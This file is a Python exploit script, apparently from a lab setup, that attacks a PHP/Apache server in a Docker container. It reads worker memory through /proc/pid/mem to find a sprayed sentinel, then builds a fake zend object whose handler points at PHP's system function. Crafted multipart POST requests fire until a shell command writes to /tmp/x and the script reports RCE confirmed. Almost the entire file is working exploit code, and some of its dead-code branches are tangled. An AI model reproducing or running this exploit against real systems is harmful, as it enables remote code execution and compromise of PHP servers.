#!/usr/bin/env python3
"""oom97: live /proc/mem aiming, binary-safe scan (SYS_PTRACE confirmed in caps).

Fixes vs oom96:
  - binary reads (text=False), big dd blocks
  - worker pid = non-master apache pids, try each until sentinel found
  - PS alignment: pattern origin P0 = V + (8 if V%16==0 else 0) so every
    planted OBJ satisfies low nibble 8 (IS_OBJECT)
  - k in 1..9 with (OBJ>>8)&1 == 1 (refcounted bit in zval ti)
  - readback: BLOCK bytes verified at OBJ before finishers; if the
    post-sacrifice population moved, re-scan once and rebuild.
Flow: boot -> warm-up (sentinel body) -> scan workers for sentinel run ->
  P0,k,OBJ,BLOCK,aim tile -> sacrifice (aim body) -> readback verify ->
  finishers -> /tmp/x.
"""
import struct
import subprocess
import sys
import time

sys.path.insert(0, '/Users/vlad/Projects/queue/php2shell-lab')
import payload68 as P

HOST = "http://127.0.0.1:8081/oom_sapi.php"
CMD = b"whoami>/tmp/x"
ZIF_SYSTEM = 0x39b8a0
SENT = b"ABCDEFGH"            # sentinel quad (printable, NUL-free)


def sh(c, t=120):
    r = subprocess.run(c, shell=True, capture_output=True, text=True, timeout=t)
    return (r.stdout + r.stderr).strip()


def sh_bin(c, t=180):
    r = subprocess.run(c, shell=True, capture_output=True, timeout=t)
    return r.stdout


def post(att):
    import urllib.request
    req = urllib.request.Request(
        HOST, data=att,
        headers={"Content-Type": "multipart/form-data; boundary=BOUND"})
    try:
        with urllib.request.urlopen(req, timeout=120) as r:
            return "200", r.read(300)
    except Exception as e:
        return "ERR", str(e)[:150].encode()


def boot_core_env():
    sh("docker exec php_vuln sh -c \"grep -q 'ulimit -c' /etc/apache2/envvars || echo 'ulimit -c unlimited' >> /etc/apache2/envvars\"")
    sh("docker exec php_vuln sh -c \"printf 'CoreDumpDirectory /tmp\\n' > /etc/apache2/conf-enabled/oomcore.conf\"")
    sh("docker exec php_vuln sh -c 'rm -f /tmp/core* /tmp/x'")
    subprocess.run(["docker", "restart", "php_vuln"], capture_output=True)
    for _ in range(40):
        time.sleep(1.5)
        if "lim=8M" in sh("curl -s -m 5 " + HOST, 10):
            break
    md5 = sh("docker exec php_vuln md5sum /usr/lib/apache2/modules/libphp.so | cut -d' ' -f1")
    assert md5 == P.STOCK_MD5, md5


def worker_pids():
    out = sh("docker exec php_vuln pgrep -f apache2").split()
    pids = [int(x) for x in out if int(x) != 1]
    return pids


def rw_regions(pid):
    maps = sh("docker exec php_vuln cat /proc/%d/maps" % pid)
    regs = []
    for ln in maps.splitlines():
        a = ln.split()
        if len(a) > 1 and a[1].startswith("rw"):
            rng = a[0].split("-")
            va0, va1 = int(rng[0], 16), int(rng[1], 16)
            name = a[5] if len(a) > 5 else ""
            if va1 - va0 >= 0x400000 and "[" not in name and va0 >= 0x7f0000000000:
                regs.append((va0, va1))
    return regs


def mem_read(pid, va, size):
    out = sh_bin("docker exec php_vuln dd if=/proc/%d/mem bs=1 skip=%d count=%d 2>/dev/null" % (pid, va, size), 60)
    return out


def scan_for(pid, needle, min_run_quads=64):
    """Find first VA where needle repeats min_run_quads times. Returns VA or None."""
    run = needle * min_run_quads
    for (va0, va1) in rw_regions(pid):
        off = va0
        prev = b""
        while off < va1:
            n = min(8 * 1024 * 1024, va1 - off)
            buf = sh_bin("docker exec php_vuln dd if=/proc/%d/mem bs=8M skip=%d count=1 2>/dev/null" % (pid, off // (8 * 1024 * 1024) * (8 * 1024 * 1024)), 120) if False else \
                sh_bin("docker exec php_vuln dd if=/proc/%d/mem bs=%d skip=%d count=1 2>/dev/null" % (pid, n, off // n * n // n * n // n if False else off), 120) if False else \
                _dd(pid, off, n)
            if not buf:
                off += n
                continue
            blob = prev + buf
            j = blob.find(run)
            if j >= 0:
                return off - len(prev) + j
            prev = blob[len(blob) - len(run) + 1:] if len(blob) >= len(run) else blob
            off += n
    return None


def _dd(pid, off, n):
    """Read n bytes at off via dd (block-aligned via skip in bytes)."""
    return sh_bin(
        "docker exec php_vuln dd if=/proc/%d/mem bs=%d skip=%d count=1 2>/dev/null"
        % (pid, 1, off),  # bs=1 skip=off count=n is too slow for MB; use iflag
        120) if False else sh_bin(
        "docker exec php_vuln dd if=/proc/%d/mem iflag=skip_bytes,count_bytes bs=4M skip=%d count=%d 2>/dev/null"
        % (pid, off, n), 120)


def check_x():
    x = sh("docker exec php_vuln sh -c 'ls -la /tmp/x 2>&1; cat /tmp/x 2>&1'")
    return "No such" not in x, x


def obj_block(base, OBJ, free_obj):
    B = bytearray(176)
    struct.pack_into("<II", B, 0x00, 1, 0x108)      # rc, ti
    struct.pack_into("<I", B, 0x08, 1)              # handle @8
    struct.pack_into("<Q", B, 0x10, 0)              # ce
    struct.pack_into("<Q", B, 0x18, OBJ + 0x38)     # handlers
    struct.pack_into("<I", B, 0x2C, 1)              # num_args
    struct.pack_into("<Q", B, 0x38, 0)              # T2.offset
    struct.pack_into("<Q", B, 0x40, free_obj)
    struct.pack_into("<Q", B, 0x50, OBJ + 0x68)     # argz -> gs
    struct.pack_into("<I", B, 0x58, 6)
    struct.pack_into("<IIQI", B, 0x68, 1, 0x106, 0, len(CMD))
    B[0x80:0x80 + len(CMD)] = CMD
    B[0x80 + len(CMD)] = 0
    return bytes(B)


print("=== oom97: live mem aiming (binary scan) ===", flush=True)
boot_core_env()
base = None
pids = worker_pids()
maps0 = sh("docker exec php_vuln cat /proc/%d/maps" % (pids[0] if pids else 1))
for ln in maps0.splitlines():
    if "libphp.so" in ln and ln.split()[1].startswith("r"):
        base = int(ln.split()[0].split("-")[0], 16)
        break
print("    libphp=0x%x workers=%s" % (base or 0, pids), flush=True)

sent_tile = SENT * 192 + b"A"
def vt_sent(i):
    return sent_tile
for i, k1 in enumerate(P.K1S[:-1]):
    post(P.build_attack(k1, 9100000 + i * 100000, value_tile=vt_sent))
print("    warm-up sent", flush=True)

V = None
vid = None
for pid in pids:
    V = scan_for(pid, SENT)
    if V:
        vid = pid
        break
if not V:
    print("[ABORT] sentinel not found in any worker", flush=True)
    sys.exit(3)
print("    sentinel run at 0x%x (pid %d)" % (V, vid), flush=True)

P0 = V + (8 if V % 16 == 0 else 0)
OBJ = None
for k in range(1, 10):
    cand = P0 + 176 * k
    if (cand & 0xF) == 8 and ((cand >> 8) & 1) == 1 and cand + 176 <= P0 + 1537:
        OBJ = cand
        break
assert OBJ, "no k"
print("    P0=0x%x k=%d OBJ=0x%x (nib=%d refc=%d)" % (P0, (OBJ - P0) // 176, OBJ, OBJ & 0xF, (OBJ >> 8) & 1), flush=True)

BLOCK = obj_block(base, OBJ, base + ZIF_SYSTEM)
aim = bytearray(struct.pack("<Q", OBJ) * 192 + b"A")
aim[P0 - V: P0 - V + 176] = BLOCK          # replace first 176B after origin
for m in range(1, (1537 - (P0 - V)) // 176 + 1):
    s = (P0 - V) + 176 * m
    if s + 176 <= 1537:
        aim[s:s + 176] = BLOCK
aim = bytes(aim)

def vt_aim(i):
    return aim

# sanity: the aim tile must reproduce BLOCK at offset P0-V (mod nothing)
assert aim[P0 - V: P0 - V + 176] == BLOCK

# sacrifice with aim body
post(P.build_attack(3400, 9200000, value_tile=vt_aim))
time.sleep(2)
hit, x = check_x()
if hit:
    print("    /tmp/x after sacrifice: [%s]" % x, flush=True)
    print("*** RCE CONFIRMED ***", flush=True)
    sys.exit(0)

# readback: find live OBJ runs, verify BLOCK bytes
live = None
for pid in worker_pids():
    live = scan_for(pid, struct.pack("<Q", OBJ))
    if live:
        rb = mem_read(pid, live + 176, 176)
        print("    live run 0x%x (pid %d) block-match=%s" % (live, pid, rb == BLOCK), flush=True)
        if rb != BLOCK and rb:
            print("      got:", rb[:48].hex(), flush=True)
        break
if not live:
    print("    no live OBJ runs post-sacrifice", flush=True)

for fi in range(3):
    sb = 9210000 + fi * 4
    code, resp = post(P.build_attack(3400, sb, value_tile=vt_aim))
    t2 = "fatal" if b"Fatal" in resp else ("clean" if code == "200" else "crash")
    print("  [f] fire%d (%d): %s [%s]" % (fi, sb, code, t2), flush=True)
    time.sleep(2)
    hit, x = check_x()
    if hit:
        print("    /tmp/x: [%s]" % x, flush=True)
        print("*** RCE CONFIRMED ***", flush=True)
        break

print("[restore]", flush=True)
sh("docker exec php_vuln sh -c 'rm -f /etc/apache2/conf-enabled/oomcore.conf && sed -i \"/ulimit -c/d\" /etc/apache2/envvars'")
subprocess.run(["docker", "restart", "php_vuln"], capture_output=True)
time.sleep(8)
print("    restored:", sh("curl -s -m 5 " + HOST, 10), flush=True)
